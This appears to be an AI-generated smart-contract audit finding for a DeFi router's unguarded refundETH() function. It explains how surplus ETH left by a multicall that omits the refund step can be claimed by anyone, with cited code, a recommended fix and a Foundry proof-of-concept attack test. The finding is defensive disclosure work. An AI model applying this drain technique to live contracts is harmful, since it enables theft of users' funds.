The code is clear. Let me confirm the exact mechanics of the `pay()` function and `refundETH()` interaction.

The vulnerability is real and confirmed. Here is the full analysis:

---

### Title
Unguarded `refundETH()` allows any caller to steal stranded native ETH left by a victim's `multicall{value}` that omits the refund step — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`refundETH()` transfers the router's entire native ETH balance to `msg.sender` with no access control. When a victim calls `multicall{value: X}([exactInputSingle(amountIn=Y)])` where `X > Y` and omits a `refundETH` step, the surplus `X - Y` ETH is left on the router after the multicall completes. Any attacker can then call `refundETH()` in a subsequent transaction and receive all of it.

### Finding Description

`refundETH()` is unconditionally public and sends the full contract ETH balance to the caller: [1](#0-0) 

The `pay()` internal function, when `token == WETH` and `nativeBalance >= value`, wraps **exactly** `value` wei and leaves the remainder as native ETH on the router: [2](#0-1) 

The `receive()` guard only blocks direct ETH pushes from non-WETH addresses; it does **not** prevent ETH from being deposited via `msg.value` on `multicall` or `exactInputSingle`, both of which are `payable`: [3](#0-2) 

`multicall` is `payable` and loops through delegatecalls, so `msg.value` is available to every sub-call: [4](#0-3) 

The design intent (include `refundETH` in the same multicall) is shown in the test suite: [5](#0-4) 

But there is **no enforcement** that the refund step is present. If a user omits it, the surplus ETH persists on the router across transaction boundaries, where any caller can claim it.

### Impact Explanation
Direct theft of native ETH. The attacker receives the victim's surplus ETH (up to the full `msg.value - amountIn`) with a single public call. No privileged role, no special setup, and no non-standard token behavior is required. The loss is bounded only by how much ETH the victim over-sent, which can be arbitrarily large (e.g., a UI rounding up to the nearest whole ETH).

### Likelihood Explanation
The Uniswap v3 multicall pattern is well-known and widely used. Users and integrators routinely send a round ETH value and rely on the refund step. Omitting `refundETH` is a realistic user/integrator mistake, and MEV bots already monitor for stranded router balances. The attack requires only one public call with no preconditions.

### Recommendation
Add a caller binding to `refundETH()` so that only the address that deposited the ETH (i.e., the original `msg.sender` of the multicall) can reclaim it. One approach is to store the initiating caller in transient storage at the start of `multicall` and check it inside `refundETH()`. Alternatively, restrict `refundETH` to be callable only within a `multicall` context (i.e., only via `delegatecall` from the same transaction), preventing cross-transaction theft.

### Proof of Concept

```solidity
// Foundry fork test sketch
function test_attacker_steals_stranded_eth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim multicalls with 2 ether but only swaps 1000 wei of WETH, omits refundETH
    vm.prank(victim);
    bytes[] memory calls = new bytes[](1);
    calls[0] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1_000,          // only 1000 wei consumed
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    router.multicall{value: 2 ether}(calls);
    // Router now holds ~2 ether - 1000 wei as native ETH

    uint256 attackerBefore = attacker.balance;

    // Attacker calls refundETH in a new transaction — no access control
    vm.prank(attacker);
    router.refundETH();

    assertApproxEqAbs(attacker.balance - attackerBefore, 2 ether - 1_000, 1, "attacker stole victim ETH");
    assertEq(address(router).balance, 0, "router drained");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-78)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
